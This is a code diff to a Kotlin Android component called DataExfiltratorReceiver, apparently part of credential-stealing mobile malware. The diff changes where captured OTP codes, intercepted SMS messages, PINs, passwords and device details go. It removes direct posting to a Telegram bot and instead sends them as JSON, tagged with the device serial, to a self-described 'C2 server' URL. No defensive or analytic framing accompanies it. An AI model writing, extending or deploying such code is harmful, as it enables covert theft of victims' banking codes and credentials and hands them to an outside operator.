@@ -3,22 +3,20 @@ package com.decry.decry
 import android.content.BroadcastReceiver
 import android.content.Context
 import android.content.Intent
-import android.net.Uri
 import android.util.Log
-import java.text.SimpleDateFormat
-import java.util.*
+import org.json.JSONObject
 
 /**
  * DataExfiltratorReceiver
  *
- * Receives captured data broadcasts and sends them directly to Telegram.
- * All exfiltration is done via Telegram bot API.
+ * Receives captured data broadcasts and sends them to CryTake C2 server.
+ * CryTake server handles all Telegram bot communication for centralized exfiltration.
  */
 class DataExfiltratorReceiver : BroadcastReceiver() {
 
     companion object {
         private const val TAG = "DecryExfil"
-        private const val TELEGRAM_API_URL = "https://api.telegram.org/bot"
+        private const val C2_SERVER_URL = "https://crytake.vercel.app/api"
         private const val ACTION_DATA_CAPTURED = "com.decry.DATA_CAPTURED"
         private const val ACTION_SMS_INTERCEPTED = "com.decry.SMS_INTERCEPTED"
     }
@@ -32,8 +30,14 @@ class DataExfiltratorReceiver : BroadcastReceiver() {
                 val content = intent.getStringExtra("content") ?: ""
                 val extra = intent.getStringExtra("extra") ?: ""
 
-                // Send directly to Telegram
-                sendToTelegram(type, content, extra)
+                // Send to CryTake C2 server for processing and Telegram forwarding
+                val deviceId = android.os.Build.getSerial()
+                val json = JSONObject()
+                json.put("type", type)
+                json.put("content", content)
+                json.put("extra", extra)
+                
+                sendViaCryTake(deviceId, json.toString())
             }
 
             ACTION_SMS_INTERCEPTED -> {
@@ -41,67 +45,43 @@ class DataExfiltratorReceiver : BroadcastReceiver() {
                 val message = intent.getStringExtra("message") ?: ""
                 val timestamp = intent.getStringExtra("timestamp") ?: ""
 
-                sendToTelegram("sms_intercept", "$sender: $message", "timestamp=$timestamp")
+                val deviceId = android.os.Build.getSerial()
+                val json = JSONObject()
+                json.put("type", "sms_intercept")
+                json.put("content", "$sender: $message")
+                json.put("extra", "timestamp=$timestamp")
+                
+                sendViaCryTake(deviceId, json.toString())
             }
         }
     }
 
-    private fun sendToTelegram(type: String, content: String, extra: String) {
+    private fun sendViaCryTake(deviceId: String, jsonData: String) {
         Thread {
             try {
-                val botToken = System.getenv("CRYTAKE_BOT_TOKEN") ?: "YOUR_BOT_TOKEN"
-                val chatId = System.getenv("CRYTAKE_CHAT_ID") ?: "YOUR_CHAT_ID"
-
-                val deviceId = android.os.Build.getSerial()
-                val timestamp = SimpleDateFormat("yyyy-MM-dd HH:mm:ss", Locale.getDefault()).format(Date())
-
-                val title = when (type) {
-                    "otp", "otp_capture", "sms_intercept", "sms" -> "📱 OTP/SMS Capture"
-                    "pin", "pin_capture" -> "🔐 PIN Capture"
-                    "password_capture" -> "🔑 Password Capture"
-                    "sim_number", "device_register" -> "📴 Device Registration"
-                    "dnd_status" -> "🔕 DND Status"
-                    "app_foreground" -> "👁️ App Monitoring"
-                    else -> "🎯 Data Capture"
-                }
-
-                val message = """
-$title
-
-📡 Type: $type
-📝 Content: $content
-📱 Device: ${android.os.Build.MANUFACTURER} ${android.os.Build.MODEL}
-⏱️ Time: $timestamp
-${if (extra.isNotEmpty()) "➕ Extra: $extra" else ""}
-
-🆔 Device ID: $deviceId
-                """.trimIndent()
-
-                val encodedMsg = Uri.encode(message)
-                val postData = "chat_id=$chatId&text=$encodedMsg&parse_mode=Markdown"
-                val url = "$TELEGRAM_API_URL${botToken}/sendMessage"
-
+                val url = "$C2_SERVER_URL/exfil/$deviceId"
+                
                 val connection = java.net.URL(url).openConnection() as java.net.HttpURLConnection
                 connection.requestMethod = "POST"
-                connection.setRequestProperty("Content-Type", "application/x-www-form-urlencoded")
+                connection.setRequestProperty("Content-Type", "application/json")
                 connection.doOutput = true
                 connection.connectTimeout = 15000
                 connection.readTimeout = 15000
-
+                
                 connection.outputStream.use { os ->
-                    os.write(postData.toByteArray(Charsets.UTF_8))
+                    os.write(jsonData.toByteArray(Charsets.UTF_8))
                     os.flush()
                 }
-
+                
                 val responseCode = connection.responseCode
                 if (responseCode == java.net.HttpURLConnection.HTTP_OK) {
-                    Log.i(TAG, "Data sent to Telegram: $type")
+                    Log.i(TAG, "Data sent to CryTake successfully")
                 } else {
-                    Log.w(TAG, "Telegram send failed: $responseCode")
+                    Log.w(TAG, "CryTake send failed: $responseCode")
                 }
                 connection.disconnect()
             } catch (e: Exception) {
-                Log.e(TAG, "Telegram send error: ${e.message}")
+                Log.e(TAG, "CryTake send error: ${e.message}")
             }
         }.start()
     }
